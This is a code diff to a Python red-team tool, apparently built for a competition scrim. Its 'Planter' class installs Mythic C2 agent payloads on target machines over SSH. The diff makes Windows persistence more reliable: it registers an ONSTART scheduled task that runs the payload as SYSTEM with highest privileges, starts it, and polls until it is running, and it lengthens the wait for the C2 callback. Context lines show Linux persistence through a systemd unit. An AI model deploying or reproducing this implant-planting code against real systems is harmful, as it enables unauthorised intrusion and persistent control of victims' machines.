@@ -73,6 +73,14 @@ def payload_file(comp_dir, entry):
     return path if path.exists() else None
 
 
+def _schtasks_status(output):
+    """The `Status:` value of a `schtasks /Query /FO LIST` body ("" when absent)."""
+    for line in (output or "").splitlines():
+        if line.strip().lower().startswith("status:"):
+            return line.split(":", 1)[1].strip()
+    return ""
+
+
 class Planter:
     """Installs frozen payloads. Uses only ctx.ssh + ctx.c2 (+ ctx.world to note)."""
 
@@ -84,8 +92,16 @@ class Planter:
 
     # -- install ------------------------------------------------------------
 
-    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=45):
-        """Install the frozen payload for `box_id` and report both facts."""
+    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
+        """Install the frozen payload for `box_id` and report both facts.
+
+        The callback window is config (`c2.callback_wait_sec`, 180s): a freshly
+        installed Mythic takes MINUTES for the first agent check-in, and the old
+        45s default reported "no callback" on every box of the 2026-10-18 scrim
+        while all six channels were live two minutes later.
+        """
+        if wait_sec is None:
+            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 180))
         os_name = os_name or self.ctx.os_of(ip)
         entry = manifest_entry(self.manifest, box_id, transport)
         if entry is None:
@@ -99,7 +115,8 @@ class Planter:
                               f"{self.comp_dir}/red/payloads"}
         transport = transport or entry.get("transport") or "http"
         if os_name == "windows":
-            installed = self._install_windows(ip, box_id, local, transport)
+            installed = self._install_windows(ip, box_id, local, transport,
+                                              wait_sec=wait_sec)
         else:
             installed = self._install_linux(ip, box_id, local, transport)
 
@@ -186,7 +203,7 @@ class Planter:
                 "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
                 "check_cmd": f"systemctl is-active {unit}"}
 
-    def _install_windows(self, ip, box_id, local, transport):
+    def _install_windows(self, ip, box_id, local, transport, wait_sec=180):
         """Install the frozen payload as an ONSTART scheduled task running as SYSTEM.
 
         A Mythic console agent (apollo) is NOT a service binary: `New-Service`
@@ -216,18 +233,26 @@ class Planter:
         except Exception as exc:                       # transport blowups are data
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
-        # /F makes the create idempotent; the query is the proof, not the rc (a
-        # second /Run of an already-running task answers non-zero).
+        # /F makes the create idempotent, and the query is the proof, not the rc (a
+        # second /Run of an already-running task answers non-zero). Every step is
+        # `&&`-chained: a bare `&` backgrounds the create and the query then reads
+        # the task before it exists (that reported status=Ready on dc01 while the
+        # task was still being registered).
         script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC ONSTART /RU SYSTEM '
-                  f'/RL HIGHEST /F && schtasks /Run /TN "{task}" & '
+                  f'/RL HIGHEST /F && schtasks /Run /TN "{task}" && '
                   f'schtasks /Query /TN "{task}" /FO LIST')
         rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                         script, timeout=180,
                                         key_path=fh.get("key_path"))
-        status = ""
-        for line in (out or "").splitlines():
-            if line.strip().lower().startswith("status:"):
-                status = line.split(":", 1)[1].strip()
+        status = _schtasks_status(out)
+        deadline = self._now() + float(wait_sec)
+        while status.lower() != "running" and self._now() < deadline:
+            time.sleep(3)
+            _r, _o, _e = self.ctx.ssh.ssh(
+                ip, fh["user"], fh.get("password") or "",
+                f'schtasks /Query /TN "{task}" /FO LIST', timeout=60,
+                key_path=fh.get("key_path"))
+            status = _schtasks_status(_o)
         ok = status.lower() == "running"
         return {"ok": ok,
                 "detail": (f"task {task} Running on {ip} (transport {transport})" if ok
